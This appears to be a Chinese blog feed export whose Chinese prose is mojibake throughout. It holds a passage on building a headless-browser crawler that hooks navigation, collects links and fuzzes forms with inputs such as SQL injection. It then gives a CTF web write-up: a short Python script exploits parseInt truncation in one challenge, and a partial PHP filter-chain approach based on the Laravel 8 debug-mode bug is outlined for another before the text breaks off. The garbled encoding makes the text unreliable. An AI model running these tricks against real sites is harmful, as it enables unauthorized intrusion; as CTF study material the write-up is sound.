æ‰§è¡Œçš„contextæ˜¯åœ¨æµè§ˆå™¨,ä¸èƒ½åœ¨ä»£ç é‡Œç›´æ¥é€šè¿‡globalç­‰æ–¹æ³•è·å–åˆ°hookçš„url.æ‰€ä»¥æ–¹æ³•å°±æ˜¯hookæ—¶æŠŠç»“æœå­˜å¥½,æ¯”å¦‚å­˜åˆ°windowé‡Œï¼Œé¢å¤–<code>page.evaluate( () =&gt; return window.foo)</code>å³å¯ã€‚</p><h2 id="hook-Navigation"><a href="#hook-Navigation" class="headerlink" title="hook Navigation"></a>hook Navigation</h2><p>  å‰ç«¯å¯¼èˆªæ˜¯è¿™æ¬¡è‡ªå·±å›°æƒ‘æœ€ä¹…çš„åœ°æ–¹ã€‚æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªéš¾ç‚¹ã€‚ä» <a href="https://www.anquanke.com/post/id/178339#h2-7" target="_blank" rel="noopener">https://www.anquanke.com/post/id/178339#h2-7</a>  è¿™é‡Œå¯ä»¥çŸ¥é“ï¼Œæˆ‘ä»¬ä¸€èˆ¬å¸Œæœ›è‡ªå·±çš„é¡µé¢ä¸ä¼šéšä¾¿å°±è·³è½¬ï¼Œä½†æ˜¯hook <code>window.location</code>æ˜¯ä¸å¯è¡Œçš„ï¼Œå› ä¸ºé»˜è®¤locationå±æ€§çš„configurableé€‰é¡¹æ˜¯falseã€‚<br>  æ–‡ä¸­æåˆ°ä¸€ç§ï¼Œç”±äºå¼€å¯äº†interception,åªè¦ä¿®æ”¹è¿”å›å€¼ä¸º204å°±å¥½äº†ã€‚</p><blockquote><p>204æ„æ€æ˜¯ï¼ŒæœåŠ¡ç«¯è¯´æ˜æ“ä½œå·²ç»æ‰§è¡ŒæˆåŠŸï¼ŒåŒæ—¶å‘Šè¯‰æµè§ˆå™¨ä¸éœ€è¦ç¦»å¼€å½“å‰çš„æ–‡æ¡£å†…å®¹</p></blockquote><p>ä½†æ˜¯æˆ‘åœ¨è‡ªå·±å°è¯•æ—¶å‘ç°ï¼Œå¹¶æ²¡æœ‰è¾¾åˆ°é¢„æœŸæ•ˆæœã€‚ä¾‹å¦‚ï¼š</p><pre><code class="html">&lt;script&gt;window.location = &#39;/test1&#39;;window.location = &#39;/test2&#39;;window.location = &#39;/test3&#39;;&lt;/script&gt;</code></pre><p>  å¯¹äºä¸Šé¢è¿™ä¸ªä¾‹å­ï¼Œç†è®ºä¸Šæˆ‘ä»¬å¿…é¡»è·å–åˆ°ä¸‰ä¸ªè·³è½¬é“¾æ¥ã€‚ç„¶è€Œå®é™…ä¸Šæ— è®ºæ˜¯å¼€æ‹¦æˆªè¿˜æ˜¯äººå·¥å¼€è¿™ä¸ªé¡µé¢ï¼Œæµè§ˆå™¨éƒ½åªä¼šæ‰§è¡Œæœ€åä¸€ä¸ªè·³è½¬ã€‚å› ä¸ºå‰ä¸¤ä¸ªéƒ½ä¼šè¢«ä¸‹ä¸€ä¸ªè·³è½¬ä¸­æ–­ã€‚<br>  æœ€ç»ˆæƒè¡¡äº†ä¸‹ï¼Œä½¿ç”¨äº†<a href="https://github.com/myvyang/chromium_for_spider/releases" target="_blank" rel="noopener">https://github.com/myvyang/chromium_for_spider/releases</a> è¿™é‡Œé‡æ–°ç¼–è¯‘æºç çš„chromiumã€‚å®ƒæŠŠä¸Šè¿°å‰ç«¯å¯¼èˆªçš„urlå…¨éƒ½é”åˆ°window.info é‡Œäº†ã€‚è§£å†³äº†é—®é¢˜ï¼Œä½†æ˜¯windowsä¸‹å°±ä¸èƒ½ç”¨äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>æ”¹ç”¨dalaoçš„ <a href="https://github.com/myvyang/chromium_for_spider" target="_blank" rel="noopener">https://github.com/myvyang/chromium_for_spider</a><br>ä¿®æ”¹è¿‡æºç çš„çˆ¬è™«åã€‚é¡µé¢é»˜è®¤ä¸ä¼šè·³è½¬äº†ï¼Œå¹¶ä¸”å¾…è·³è½¬çš„urlç›´æ¥åœ¨window.infoé‡Œã€‚</p><p>å¦å¤–éœ€è¦å®ç°çš„æ˜¯,å¯¹äºè¯·æ±‚é‡ŒåŒ…å«å›¾ç‰‡èµ„æºçš„ï¼Œæˆ‘ä»¬éœ€è¦è¿”å›è‡ªå·±çš„å›¾ç‰‡é¿å…ä¸å¿…è¦çš„åŠ è½½ã€‚å¯¹äºåŒ…å«logoutè¯·æ±‚çš„æˆ‘ä»¬æŠŠå®ƒabortæ‰ã€‚å› ä¸ºå¦‚æœçˆ¬è™«çš„cookieå› ä¸ºlogoutæ¸…é™¤äº†å°±ä¼šå¯¼è‡´çˆ¬çš„ä¿¡æ¯å˜å°‘ã€‚æ‰€ä»¥éœ€è¦å¤„ç†ã€‚<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_e0c2b22c5f399394442482f6e2260096.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_e0c2b22c5f399394442482f6e2260096.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿˜æœ‰ä¸€ä¸ªå‘,æˆ‘ä»¬æƒ³è¾¾åˆ°çš„ç›®çš„æ˜¯ï¼š</p><blockquote><p>å‰ç«¯é‡å®šå‘å…¨éƒ¨å–æ¶ˆï¼Œå¹¶è®°å½•ä¸‹ç›®æ ‡é“¾æ¥æ”¾å…¥ä»»åŠ¡é˜Ÿåˆ—<br>åç«¯é‡å®šå‘å“åº”çš„bodyä¸­ä¸åŒ…å«å†…å®¹ï¼Œåˆ™è·Ÿéšè·³è½¬<br>åç«¯é‡å®šå‘å“åº”çš„bodyä¸­å«æœ‰å†…å®¹ï¼Œæ— è§†é‡å®šå‘ï¼Œæ¸²æŸ“bodyå†…å®¹ï¼Œè®°å½•ä¸‹locationçš„å€¼æ”¾å…¥ä»»åŠ¡é˜Ÿåˆ—</p></blockquote><p>è¿™é‡Œé’ˆå¯¹åç«¯è·³è½¬, ç”±äºæˆ‘é‡‡ç”¨çš„æ˜¯ç›‘å¬response äº‹ä»¶,æ‰€ä»¥å“åº”å…¶å®åº”è¯¥å·²ç»è¿”å›äº†ã€‚è¿™ä¸è¶³ä»¥åšåˆ°<code>bodyä¸­å«æœ‰å†…å®¹ä¸è·Ÿéšè·³è½¬</code>ã€‚æ‰€ä»¥è¿˜æ˜¯å¾—è‡ªå·±å®ç°,è¿™é‡Œæˆ‘ç”¨node-fetchæ¥åˆ¤æ–­è¿”å›å†…å®¹ã€‚æ— å†…å®¹ç›´æ¥è·Ÿéšï¼Œæœ‰çš„è¯å°±æ‰‹åŠ¨è®¾ç½®å“åº”çŠ¶æ€ç ä¸º200ã€‚</p><h2 id="æ”¶é›†link-amp-amp-æ³¨é‡Š"><a href="#æ”¶é›†link-amp-amp-æ³¨é‡Š" class="headerlink" title="æ”¶é›†link &amp;&amp; æ³¨é‡Š"></a>æ”¶é›†link &amp;&amp; æ³¨é‡Š</h2><p>  è¿™ä¸€éƒ¨åˆ†åšçš„æ˜¯æ”¶é›†å„ç§domæ„å»ºå¥½ä¹‹åçš„linkä¸hrefç­‰ç­‰ä¼šåŒ…å«çš„url.ä¹‹åä¹Ÿä¼šå°†å…¶åŠ å…¥åˆ°é˜Ÿåˆ—ä¸­,åšèµ·æ¥è¿˜æ˜¯æ¯”è¾ƒè½»æ¾çš„ã€‚<br>  <code>const links = await page.$$eval(&#39;[src],[href],[action],[data-url],[longDesc],[lowsrc]&#39;, getLink);</code></p><p>  è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯baseæ ‡ç­¾æ˜¯å¦å­˜åœ¨ã€‚å¦‚æœæœ‰baseæ ‡ç­¾çš„è¯ä¼˜å…ˆæŠŠbaseä½œä¸ºæ•´ä¸ªpageçš„baseURlè½½å…¥,ç„¶åæ”¶é›†å„ç§é“¾æ¥(å¯èƒ½æœ‰ç›¸å¯¹é“¾æ¥)parseå³å¯ã€‚nodejs çš„<code>URL</code>ç±»æ„é€ å‡½æ•°æ¥æ”¶çš„ä¸¤ä¸ªå‚æ•°åˆšå¥½å°±æ˜¯inputå’Œbase,æ¯”è¾ƒå¥½çš„è§£å†³äº†ç›¸å¯¹é“¾æ¥çš„é—®é¢˜ã€‚<br>  ç„¶åæ˜¯comment çš„è¯†åˆ«ã€‚æœ‰æ—¶å€™æ³¨é‡Šé‡Œä¼šå­˜åœ¨éšè”½çš„æ¥å£ï¼Œå¾€å¾€æ˜¯è§£å†³é—®é¢˜çš„å…¥æ‰‹ç‚¹ã€‚è¿™é‡Œç”¨xapthè¯†åˆ«å‡ºæ¥å¹¶ä¸”æ­£åˆ™åŒ¹é…å‡ºurlå³å¯.æ¯”è¾ƒå°´å°¬çš„æ˜¯æ­£åˆ™åªèƒ½åŒ¹é…å®Œæ•´çš„url,å› ä¸ºç„å­¦é—®é¢˜æ²¡åŒ¹é…åˆ°ç›¸å¯¹è·¯å¾„ï¼Œé‚æ”¾å¼ƒã€‚</p><h2 id="è¡¨å•è¾“å…¥ä»¥åŠæäº¤ã€‚"><a href="#è¡¨å•è¾“å…¥ä»¥åŠæäº¤ã€‚" class="headerlink" title="è¡¨å•è¾“å…¥ä»¥åŠæäº¤ã€‚"></a>è¡¨å•è¾“å…¥ä»¥åŠæäº¤ã€‚</h2><p>  è¡¨å•ä¿¡æ¯çš„å¡«å†™ä»¥åŠæäº¤ã€‚è¿™é‡Œå…¶å®è¿˜å¥½ï¼Œæ²¡å•¥å‘ã€‚ä¸»è¦å°±æ˜¯æ ¹æ®å„ç§è¡¨å•ç±»å‹ï¼Œè¾“å…¥ç±»å‹æ¥å¸¸è¯†æ€§çš„fuzzä¸€äº›å¯èƒ½å¯¼è‡´æ¼æ´çš„è¾“å…¥ï¼Œæ¯”å¦‚å°è¯•sqlæ³¨å…¥ç­‰ã€‚<br>  å…·ä½“ä»£ç å®ç°ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆç”¨<code>$$</code>æ‹¿åˆ°è¡¨å•çš„node.å¯¹äºæ¯ä¸ªè¡¨å•nodeæˆ‘ä»¬å»è·å–å®ƒå¯èƒ½çš„è¾“å…¥ï¼ŒåŒ…æ‹¬<code>input, select, textarea, datalist</code>ç­‰ã€‚æ ¹æ®ä¸åŒç±»å‹çš„node,æˆ‘ä»¬çš„å¤„ç†å½“ç„¶ä¸åŒã€‚ä½†æ˜¯èƒ½è¾“å…¥æ–‡å­—çš„å½“ç„¶æ˜¯å°è¯•ä¸€äº›fuzzæ€§è´¨çš„è¾“å…¥ã€‚å‡å¦‚è¿™ä¸ªnodeçš„è¾“å…¥ç±»å‹æ˜¯å¯ä»¥æ¨æ–­çš„ï¼Œæˆ‘ä»¬å°±å°½å¯èƒ½è¾“å…¥æ¯”è¾ƒåˆç†çš„å†…å®¹ã€‚ä¾‹å¦‚éœ€è¦è¾“å…¥é‚®ç®±çš„åœ°æ–¹ï¼Œclass,name,idç­‰ç­‰å¯èƒ½ä¼šåŒ…å«<code>email</code>,æˆ‘ä»¬æå–å‡ºæ¥å°±å¯ä»¥è¾“å…¥äº†ã€‚<br>  æ­¤å¤„å­¦åˆ°çš„ä¸€ä¸ªæƒ³æ³•æ˜¯ï¼Œå¯¹äºè¡¨å•æäº¤æˆ‘ä»¬å¯ä»¥å¦å¤–å¼€ä¸€ä¸ªiframe,æ¥æ”¶è¡¨å•æäº¤ã€‚ç”±äºè¿™é‡Œchromiumå·²ç»é”ä½å„ç§å¯¼èˆªäº†,æäº¤çš„urlæˆ‘ä»¬å½“ç„¶ä¹Ÿèƒ½æ”¶é›†åˆ°ã€‚</p><h2 id="äº‹ä»¶è§¦å‘"><a href="#äº‹ä»¶è§¦å‘" class="headerlink" title="äº‹ä»¶è§¦å‘"></a>äº‹ä»¶è§¦å‘</h2><p>äº‹ä»¶è§¦å‘çš„æ€è·¯å°±æ˜¯ï¼Œå°½å¯èƒ½å»è§¦å‘æ‰€æœ‰å·²æ³¨å†Œçš„äº‹ä»¶ã€‚</p><ul><li>dom event trigger</li></ul><p>å¯¹äºæœ€æ—©hookçš„dom event, æˆ‘ä»¬ç›´æ¥è§¦å‘ã€‚ç”±äºæœ€æ—©hook jsæ—¶å·²ç»æ”¶é›†è¿‡ä¸€äº›dom çš„äº‹ä»¶äº†ã€‚æ‰€ä»¥è¿™é‡Œç›´æ¥æå–,ç”¨dispatchEventè§¦å‘å³å¯ã€‚</p><pre><code class="javascript">let newEvent = document.createEvent(&#39;CustomEvent&#39;);newEvent.initCustomEvent(event[&quot;eventName&quot;], true, true, null);event[&quot;element&quot;].dispatchEvent(newEvent);</code></pre><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_832a76c700d679ff140dc793da546dd3.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_832a76c700d679ff140dc793da546dd3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><ul><li>inline event trigger</li></ul><p>é™¤äº†domäº‹ä»¶è§¦å‘,æˆ‘ä»¬è¿˜éœ€è¦è§¦å‘å†…è”äº‹ä»¶ï¼Œä»€ä¹ˆæ˜¯å†…è”äº‹ä»¶å‘¢ï¼Ÿè¿™é‡Œå­˜åœ¨ä¸€ä¸ªäº‹ä»¶æ•è·ä¸å†’æ³¡æœºåˆ¶çš„é—®é¢˜ã€‚</p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_6c4b64749c70dfab550f812671aae34d.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_6c4b64749c70dfab550f812671aae34d.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><blockquote><p>æµè§ˆå™¨æ£€æŸ¥å®é™…ç‚¹å‡»çš„å…ƒç´ æ˜¯å¦åœ¨å†’æ³¡é˜¶æ®µä¸­æ³¨å†Œäº†ä¸€ä¸ªonclickäº‹ä»¶å¤„ç†ç¨‹åºï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿è¡Œå®ƒ<br>ç„¶åå®ƒç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªç›´æ¥çš„ç¥–å…ˆå…ƒç´ ï¼Œå¹¶åšåŒæ ·çš„äº‹æƒ…ï¼Œç„¶åæ˜¯ä¸‹ä¸€ä¸ªï¼Œç­‰ç­‰ï¼Œç›´åˆ°å®ƒåˆ°è¾¾<code>&lt;html&gt;</code>å…ƒç´ ã€‚</p></blockquote><p>(è·Ÿdispatchçš„æœºåˆ¶æœ‰ç‚¹åƒã€‚)</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰äº‹ä»¶å¤„ç†ç¨‹åºéƒ½åœ¨å†’æ³¡é˜¶æ®µè¿›è¡Œæ³¨å†Œã€‚æ‰€ä»¥äº‹ä»¶ä¼šå­˜åœ¨ä¸€ä¸ªpropogateçš„è¿‡ç¨‹ã€‚æˆ‘ä»¬å‡å¦‚ç»™æŸä¸ªåµŒå¥—divçš„æœ€å¤–å±‚æ³¨å†Œäº†äº‹ä»¶ï¼Œé‚£ä¹ˆç‚¹å‡»å®ƒçš„å­èŠ‚ç‚¹å…¶å®ä¹Ÿä¼šè§¦å‘è¿™ä¸€äº‹ä»¶ã€‚</p><p>æ‰€ä»¥ï¼Œè¿™é‡Œæˆ‘ä»¬å¯¹äºå†…è”äº‹ä»¶çš„å¤„ç†æ–¹å¼æ˜¯ï¼šå…ˆæŒ‰ç…§å¸¸è§äº‹ä»¶è·å–åˆ°èŠ‚ç‚¹ã€‚è§¦å‘å®Œåï¼Œå¯¹å…¶æ¯å±‚å­èŠ‚ç‚¹ä¹Ÿå°è¯•è§¦å‘ä¸‹ï¼Œè¿™ä¸ªå±‚æ•°é™åˆ¶æ˜¯3å±‚ã€‚</p><pre><code class="javascript">const fireInlineEvent = (node, eventName) =&gt; {    console.log(`Triggering Inline event ${eventName}`)    let event = document.createEvent(&quot;CustomEvent&quot;);    event.initCustomEvent(eventName, false, true, null);    try {        node.dispatchEvent(event);    } catch (err) {        console.log(err);    }}</code></pre><p>æˆ‘ä»¬<code>initCustomEvent</code>çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯<code>canBubble</code>.ä»£è¡¨å®ƒæ˜¯å¦ä¼šå†’æ³¡ã€‚    </p><p>è¿™é‡Œå…³æ‰headlessçœ‹ä¸‹æ•ˆæœå¦‚ä½•ã€‚æˆ‘çš„æµ‹è¯•é¡µé¢æ˜¯</p><pre><code class="html">&lt;div id=&quot;div1&quot; onclick=&quot;console.log(1)&quot;&gt;  Test Div1  &lt;div class=&quot;a&quot;&gt;    Div1 Child1    &lt;div class=&quot;b&quot;&gt;Div1 Child1 Child1&lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;div2&quot;&gt;Test Div2&lt;/div&gt;&lt;script&gt; div2.onclick = () =&gt; console.log(233); div1.addEventListener(&#39;click&#39;, function setup(e) {    console.log(&#39;No&#39;);  });&lt;/script&gt;</code></pre><p>å¯ä»¥çœ‹åˆ°è§¦å‘äº†3æ¬¡ã€‚ä¸”åä¸¤æ¬¡ç”±äºæ²¡æœ‰å†’æ³¡å¹¶ä¸ä¼šè§¦å‘<code>console.log(1)</code><br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_19d2c693f022dc58a1ee7dbc1088c407.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_19d2c693f022dc58a1ee7dbc1088c407.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="å…¥é˜Ÿ-amp-amp-urlå»é‡"><a href="#å…¥é˜Ÿ-amp-amp-urlå»é‡" class="headerlink" title="å…¥é˜Ÿ &amp;&amp; urlå»é‡"></a>å…¥é˜Ÿ &amp;&amp; urlå»é‡</h2><p>ä¸Šè¿°æ‰€æœ‰æ“ä½œåšå®Œå,åº”è¯¥å°±æ”¶é›†åˆ°è¶³å¤Ÿå¤šçš„urlå¹¶è§¦å‘äº†å°½å¯èƒ½å¤šçš„äº‹ä»¶äº†ã€‚æŠŠä»–ä»¬å…¥é˜Ÿï¼Œclusterå°±ä¼šå¦å¤–å¼€ä¸€ä¸ªçº¿ç¨‹ç»§ç»­æ‰§è¡Œæˆ‘ä»¬çš„ä»»åŠ¡ã€‚</p><p>å½“ç„¶è¿™æ ·å°±å­˜åœ¨ä¸€ä¸ªurlåˆ¤æ–­ä¸å»é‡çš„é—®é¢˜ã€‚å¯¹äºåˆ¤æ–­ï¼Œæˆ‘æ˜¯é‡‡å–åªçˆ¬è¾“å…¥åŸŸååŠå…¶å­åŸŸåçš„æ–¹å¼,å¦åˆ™ä¸å…¥é˜Ÿï¼›è€Œå»é‡è¿™ç‚¹å°±æ¯”è¾ƒé‡è¦äº†ï¼Œæ¯”å¦‚æˆ‘å°è¯•çˆ¬äº†ä¸‹baidu,ç»“æœæ”¶é›†åˆ°å‡ ç™¾ä¸ªé“¾æ¥ï¼Œç»§ç»­å…¥é˜Ÿåçˆ¬çš„åˆå‡ ä¹æ˜¯é‡å¤çš„url,æ˜¾ç„¶æ˜¯åœ¨åšæ— ç”¨åŠŸã€‚æˆ‘ç›®å‰å•é’ˆå¯¹urlå¾ˆä¸ä¼˜é›…çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯ç”¨Setæ•°æ®ç»“æ„ç»´æŠ¤ç‹¬ç«‹æ€§ã€‚ä½†æ˜¯å‡å¦‚å·¥ç¨‹é¡¹ç›®çš„è¯è‚¯å®šæ˜¯è¦ç”¨åˆ°redisé›†åˆäº†ã€‚ä¸è¿‡è¿™æ ·ä¸€ä¸ªç®€å•çˆ¬è™«åº”è¯¥ç”¨ä¸åˆ°æ•°æ®åº“å§( </p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>æ€»çš„æ¥è¯´å†™è¿™ä¸ªçˆ¬è™«ä¸»è¦æ˜¯é”»ç‚¼ä¸‹æŠ€æœ¯ä»¥åŠå®è·µä¸‹æ–‡ç« ï¼Œå¯ä»¥è¯´è¿˜æ˜¯å­¦åˆ°ä¸å°‘çŸ¥è¯†çš„ã€‚å‡å¦‚è¿™ç¯‡æ–‡ç« æˆ–è€…é¡¹ç›®æœ‰å¸®åˆ°ä½ çš„åœ°æ–¹é‚£å°±ç‚¹ä¸ªstar å§ :)ã€‚<a href="https://github.com/baiyecha404/Dynamic-Crawler" target="_blank" rel="noopener">https://github.com/baiyecha404/Dynamic-Crawler</a> è¯´ä¸å®šè¿˜å¯ä»¥ä¼˜åŒ–ä¸‹ã€‚</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://github.com/LFYSec/CrawlerNode" target="_blank" rel="noopener">https://github.com/LFYSec/CrawlerNode</a> <a href="https://github.com/Passer6y/CrawlerVuln" target="_blank" rel="noopener">https://github.com/Passer6y/CrawlerVuln</a> <a href="https://github.com/myvyang/chromium_for_spider" target="_blank" rel="noopener">https://github.com/myvyang/chromium_for_spider</a> <a href="https://www.anquanke.com/post/id/178339" target="_blank" rel="noopener">https://www.anquanke.com/post/id/178339</a> <a href="http://blog.fatezero.org/2018/04/09/web-scanner-crawler-02/" target="_blank" rel="noopener">http://blog.fatezero.org/2018/04/09/web-scanner-crawler-02/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹æ¯-WEB</title>
      <link href="2021/05/30/%E6%98%A5%E7%A7%8B%E6%9D%AF-WEB/"/>
      <url>2021/05/30/%E6%98%A5%E7%A7%8B%E6%9D%AF-WEB/</url>
      
        <content type="html"><![CDATA[<p>å‘¨æœ«çœ‹pwn2winçš„é—´éš™åšäº†ä¸‹æ˜¥ç§‹æ¯çš„webã€‚ä»ç»“æœä¸Šçœ‹é¢˜ç›®è´¨é‡è¿˜å¯ä»¥ï¼Œä¹Ÿæ‹¿äº†2ä¸ªä¸‰è¡€ã€‚æœ¬æ¥ä»¥ä¸ºå¯ä»¥ak webçš„ï¼Œä½†æ˜¯å› ä¸ºæœ€åä¸€é¢˜è¿œç¨‹ç¯å¢ƒå¤ªå¡äº†ï¼Œæ‰€ä»¥æ²¡åœ¨æ¯”èµ›æ—¶é—´å†…åšå‡ºæ¥ã€‚å› æ­¤è¿™é‡Œæ€»ç»“æ€§åœ°ä»‹ç»ä¸‹è§£ä¸‰ä¸ªwebçš„æ–¹æ³•æ€è·¯ã€‚</p><a id="more"></a><h2 id="ctfaker"><a href="#ctfaker" class="headerlink" title="ctfaker"></a>ctfaker</h2><p>typescriptæºç ç»™å‡ºæ¥äº†ã€‚ä»”ç»†çœ‹ä¼šå‘ç°å…¶å®å¯æ§ç‚¹åªæœ‰<code>/levelup</code>ä¸€å¤„ï¼Œæ‰€ä»¥å¿«é€Ÿå®šä½åˆ°factorä¸Š<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_66f0b0ef0bcbbbb6ec4c4165af0cb982.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_66f0b0ef0bcbbbb6ec4c4165af0cb982.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>factorç”±å¯æ§å€¼ç»<code>parseInt</code>å¤„ç†ã€‚è€Œ<code>parseInt</code> æœ‰ä¼ å­—ç¬¦ä¸²æˆ–ç§‘å­¦è®¡æ•°æ³•è¢«æˆªæ–­çš„ç‰¹æ€§ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è®©å±æ€§å˜å¾—è¶³å¤Ÿå¤§ã€‚ä¸€æ¬¡æ‰“è´¥æ‰€æœ‰æ€ªå…½</p><p><code>parseInt(&#39;99999999999999e-40&#39;) == 99999999999999</code></p><pre><code class="python"># coding: utf-8# -**- author: byc_404 -**-url = &#39;xxx&#39;r = requests.post(url + &#39;levelup&#39;, json = {    &#39;f&#39;:&#39;99999999999999e-40&#39;})r = requests.get(url+&#39;fight&#39;)r = requests.get(url+&#39;monster&#39;)print(r.text)</code></pre><h2 id="easyfilter"><a href="#easyfilter" class="headerlink" title="easyfilter"></a>easyfilter</h2><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…³é”®ä»£ç <br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_d57ba63861c48ccfa33c07001e8d84f1.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_d57ba63861c48ccfa33c07001e8d84f1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å…¶å®ç†Ÿæ‚‰çš„å°±åº”è¯¥çŸ¥é“ï¼Œè¿™æ˜¯laravel8 debug modeä¸‹æ¼æ´ä»£ç çš„ç®€åŒ–ç‰ˆã€‚å³è¿›è¡Œä¸€ç»„å¯æ§çš„<code>file_get_contents + file_put_contents</code>ã€‚<br>laravel8 çš„æ´å¦‚æœæ²¡æœ‰è·Ÿè¿‡çš„è¯ï¼Œè¿˜æ˜¯å»ºè®®çœ‹ä¸€ä¸‹ã€‚å¾ˆå¥½çš„è¿ç”¨äº†phpå„ç§filterçš„æ€§è´¨ã€‚</p><p>å›åˆ°æœ¬é¢˜ã€‚æˆ‘ä»¬å¯ä»¥åŒæ ·é‡‡ç”¨è¿™ä¸ªæ€è·¯ï¼Œå…ˆé€šè¿‡æŠ¥é”™æ‰‹æ®µåˆ›å»ºlogæ–‡ä»¶ã€‚</p><p>çœ‹ä¸€ä¸‹logæ ¼å¼ã€‚<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_238a305fa8aa9897cc392e9d062a1096.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_238a305fa8aa9897cc392e9d062a1096.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è™½ç„¶è·Ÿlaravelä¸å¤ªä¸€æ ·ï¼Œä½†è¿˜æ˜¯èƒ½ç”¨ç±»ä¼¼æ‰‹æ®µå¤„ç†çš„ã€‚è¿™é‡Œæˆ‘ç®€å•æä¸€ä¸‹laravelçš„æ€è·¯</p><p>1.convert.base64-decode è¿‡æ»¤å™¨å¯ä»¥ç›´æ¥æŠŠébase64å­—ç¬¦å¤„ç†æ‰<br>2.convert.iconv.utf-16le.utf-8 å¯ä»¥æŠŠutf-16è½¬utf-8ã€‚è¿™ä¸€æ­¥å¯ä»¥å°†å¾ˆå¤šæ­£å¸¸å­—ç¬¦è½¬æˆä¹±ç </p><p>é‚£ä¹ˆä¼¼ä¹ï¼Œæˆ‘ä»¬å¯ä»¥å°†payloadçš„base64ç¼–ç è¿›è¡Œutf-16ç¼–ç 